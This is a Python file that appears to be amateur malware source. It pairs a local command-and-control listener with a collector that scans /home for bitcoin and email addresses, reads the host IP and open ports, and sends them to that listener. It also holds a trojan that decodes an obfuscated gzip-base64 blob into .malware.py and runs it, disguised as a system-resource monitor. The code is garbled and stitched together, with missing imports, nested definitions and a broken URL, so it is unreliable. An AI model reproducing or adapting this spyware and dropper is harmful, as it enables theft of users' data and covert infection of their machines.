import json
import os
import socket
import base64
import random
from string import ascii_lowercase

import requests

# create TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# listen of localhost port 1337
s.bind(("127.0.0.1", 1337))

# queue up to 5 requests
s.listen(5)

print("listening on port 1337...")

while True:
    # establish a connection
    clientsocket, client_ip = s.accept()
    print("[+] recived a connection from -> {}".format(client_ip))

    # get the encoded data
    encoded_data = clientsocket.recv(4096)
    clientsocket.close()

    # open a file with a random name and inster the decoded data into it
    random_fd = open("".join(random.choices(ascii_lowercase), k=10), "w")
    random_fd.write(base64.b64decode(encoded_data).decode("UTF-8"))
    random_fd.close()

    def main():
     # get hostname of the machine
     hostname = socket.gethostname()

     # get the puvlic ipv4 address of the machine
     headers = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
     }
     public_ip = requests.get("https://i[api.co/ip", headers = headers).text

     # search for bitcoin and email addresses
     bitcoin_address_list = []
     email_address_list = []
     for root, subdirs, files in os.walk("/home"):
         for file in files:
             file_fd = open("{}/{}".format(root, file), "r")
             try:
                 # read the contents of each file
                 file_contents = file_fd.read().strip()

                 # search for bitcoin addresses
                 bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents)

                 # search for email addresses
                 email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)

                 # check if we have found any bitcoin addresses or emails
                 if len(bitcoin_addresses) > 0:
                     bitcoin_addresses_list = bitcoin_addresses_list + bitcoin_addresses
                 if len(email_addresses) > 0:
                     email_addresses_list = email_addresses_list + email_addresses
             except:
                 pass

     open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'").read()
     open_ports = open_ports.strip().split("\n")

     # encode data to json and send them to command and control server
     data = {
         "machine_hostname": hostname,
         "machine_ip": public_ip,
         "machine_open_ports": open_ports,
         "bitcoin_addresses_found": bitcoin_addresses_list,
         "email_addresses_found": email_addresses_list
     }

     # base64 encode the json data
     encoded_data = base64.b64encode(json.dumps(data).encode())

     # send data to command and control server

     # create a socket object
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

     # connect to command and control server on port 1337
     s.connect(("127.0.0.1", 1337))
     s.send(encoded_data)
     s.close()

def trojan():
    malware_fd = open(".malware.py", "w")
    blob = "H4sICAncMmEAA21hbHdhcmUucHkAjVZtb9s2EP7uX3FTB0RCZMmKHadx4WHB0K7d1q5YO2BYEgi0RMesZVIj6cSJ4/++IyX6TXY22bBJ3nMvfHh31Kvv4rmS8YjxuHzUE8G7LTYrhdQg6T9zqrRycyWyKdVuNiKK9ntu9k0JvtFzI6FarVZOxzAjjPvBoAX4vII7qmEilOZkRkGMQU8oIrIJ49Qi1rJh7TNCDbfoB60tM0a1nI8KlgEr73tA8lxSpQ5apSSnUqHRpZ2bx/tTUdm+uqNcewPwPoonVhQkPo864P+VJG/gN8bnC1i87qf93huQ94OL11EngJ9pNhXxWSfp4DeBd0zSsVjERuhZ4yv7W0WWshKdOjbNXnxvonWpBnHMSlKyKBM48MKtEOtREGm60G7DihKZTWAsJIyYzgTjQHgOFNkt3M6psuBanq5X04IpjYavb63c6hyVGg9SCB2Cmo9yJlUIY1ZQBehRqOiBFFPfiydiRr36UJ2WgRmUhW9EVoxL6ThHL6Kk3PeWq3i58iLUmhHtV+4MJgjBk16wo6vl466xihCJLNlzzgTXeIb23CkxHKGhhoKNYA0duogiY8YPIqUlK1167To6xPwO39tPg3t7+tGY8ZwUhS89/zrp3i6T1TVpT2ftp6v2+1/anz63/07al7fLs37Y7a6eR1mC4qeOWepehueXq8ALd3fwX5EeyovtZy8H9qOs3Ufp7emPLpTTm8gMMfjwYvW/4skmWCrAxvBAYULuKUY2x5wl/LHJJLigm7GigQKTpkFtAD9Ap5kaB4/BJfkRwWlTcCyMPeZeCOJInR1cPt1fbvLpMjYrhDKdcMfVIqOlboZREmXacHUcpmfi8doSBNOjkXTeaJVGmlbSoSn4sqpYTrXSREO7LAjX8Ax3kpbQZmDCR3vPQB6mcLIsJUPx973VyRrzGU5ucsya7uomOjoY2P/z1YkX1DV5IJr1xNVrpMqCYUu94XXTqLdKeSZyCjnRBLSwN5Rtl4py2zRmZjUTsxmx+ZjbJiJFgQB5T6W1YpV3LoyaptRdR3htuGHYRGFXH2xugQOAzXYQuJlsIZvZaisI4YfzeEt1P8uc4qHsq2+tmrvqcncUmvSw9Bk6quvDCvK05qeCR6N+rxL4Bh3l81mpfAMJono9CDZ3GTLuzuaFU6jhGeaDpkDqFwIQo280q4JWm9eE6s+vZ1fv0g+f3n4NnfTL7z/9mn75+sfbq4/rMNAbR0MvB2FKxL7PJN3uReUzqhV930vOLqIOfhLshwYQBDXEbNHfZsoJXPW2WthP0tTkTprCcAhempo3pTT1qjKuXpv+BfXo/OqiCQAA"
    malware = gzip.decompress(base64.b64decode(blob).decode("UTF-8"))
    malware_fd.write(malware)
    malware_fd.close()

    # execute malware
    os.system("usr/bin/python3 .malware.py")

    def main():
    # child proccess
        pid = os.fork()

        if pid > 0:
            # parent proccess
            while True:
                # percent of CPU used
                cpu = psutil.cpu_percent()
                # percent of RAM used
                ram = psutil.virtual_memory().percent
                # percent of Disk Space used
                disk = psutil.disk_usage("/").percent
                # number of Proccesses running
                proccess_count = 0
                for _ in psutil.process_iter():
                    proccess_count += 1
                
                # print to screen
                print("------------------------------")
                print("| CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES|")
                print("| {:02}%     | {:02}%     | {:02}%     | {:02}%     |".format(int(cpu), int(ram), int(disk), int(proccess_count)))
                print("------------------------------")
    
                time.sleep(2)
        else:
            # child proccess
             trojan()
    
